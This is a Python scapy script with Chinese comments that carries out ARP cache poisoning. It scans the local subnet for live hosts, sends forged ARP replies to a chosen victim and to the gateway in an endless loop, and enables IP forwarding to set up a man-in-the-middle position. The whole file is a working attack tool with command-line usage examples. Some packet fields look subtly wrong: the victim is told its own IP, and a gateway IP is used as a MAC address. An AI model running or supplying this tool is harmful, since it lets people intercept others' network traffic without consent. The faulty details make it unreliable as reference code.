from scapy.all import *
import re
import time
import sys
import os
import optparse
# 存放本届的mac地址 
lmac =""

# 存放本机的IP地址
lip = ""

# 存放存活主机的ip和mac的字典
liveHost = {}

# 获取存活主机的IP地址和mac地址的函数
def GetAllMAC():
    scanList = lip + '/24'
    try:
        # 通过对每个ip进行arp广播，获得存活主机的mac地址
        ans,unans = srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=scanList),timeout=2)
    except Exception as e:
        print(e)
    # arp广播包发送完毕后执行
    else:
        for send,rcv in ans:
            # 对响应内容的ip地址和mac地址进行格式化输出，存入addrList
            addeList = rcv.sprintf('%Ether.src%|%ARP.psrc%')
            # 把ip当作key，mac当作value存入liveHost字典
            liveHost[addeList.split('|')[1]] = addeList.split('|')[0]
# 提取指定ip主机的mac地址
def GetOneMAC(targetIP):
    # 若该ip地址存在，则返回mac地址
    if targetIP in liveHost.keys():
        return liveHost[targetIP]
    else:
        return 0
# 编写毒化函数，对目标主机以及网关不断发送arp包来不断毒化
def poison(targetIP,gatewayIP,ifname):
    # 获取毒化主机的mac地址
    targetMAC = GetOneMAC(targetIP)
    # 获取目标网关的MAC地址
    gatewayMAC = GetOneMAC(gatewayIP)
    if targetMAC and gatewayMAC:
        # 用while持续毒化
        while True:
            # 对目标主机进行毒化
            sendp(Ether(src=lmac,dst=targetMAC)/ARP(hwsrc=lmac,
            hwdst=targetMAC,psrc=targetIP,pdst=targetIP,op=2),iface=ifname,verbose=False)
            # 对网关进行毒化
            sendp(Ether(src=lmac,dst=gatewayIP)/ARP(hwsrc=lmac,
            hwdst=gatewayMAC,psrc=targetIP,pdst=gatewayIP,op=2),iface=ifname,verbose=False)           
            time.sleep(1)
    else:
        print("目标主机/目标主机ip有误，请检查！")
        sys.exit(0)

# 编写main函数，添加相关参数以及开启路由转发功能
if __name__ == '__main__':
    parser = optparse.OptionParser('Useage:python %prog -r targetIP -g gatewayIP -i iface \n \n'
    'Example: python %prog -r 192.168.1.130 -g 192.168.61.254 -i eth0' 
    )
    #  添加目标主机参数 -r
    parser.add_option('-r','--rhost',dest='rhost',default='192.168.1.1',type='string',help='target host')
    # 添加网关参数 -g
    parser.add_option('-g','--gateway',dest='gateway',default='192.168.1.1',type='string',help='target host')
    #  添加网卡参数 -i
    parser.add_option('-i','--iface',dest='iface',default='eth0',type='string',help='interfaces name')
    (options,args) = parser.parse_args()
    lmac = get_if_hwaddr(options.iface)
    lip = get_if_addr(options.iface)
    print('===开始收集存活主机ip和mac===')
    GetAllMAC()
    print("===收集完成===")
    print("===收集数量:{0}===".format(len(liveHost)))
    print("===开启路由转发功能===")
    os.system("echo 1 >> /proc/sys/net/ipv4/ip_forward")
    os.system("sysctl net.ipv4.ip_forward")
    print("===开始进行arp毒化===")
    try:
        poison(options.rhost,options.gateway,options.iface)
    except KeyboardInterrupt:
        print("===停止arp毒化===")
        print("===停止路由转发功能===")
        os.system("echo 0 >> /proc/sys/net/ipv4/ip_forward")
        os.system("sysctl net.ipv4.ip_forward")
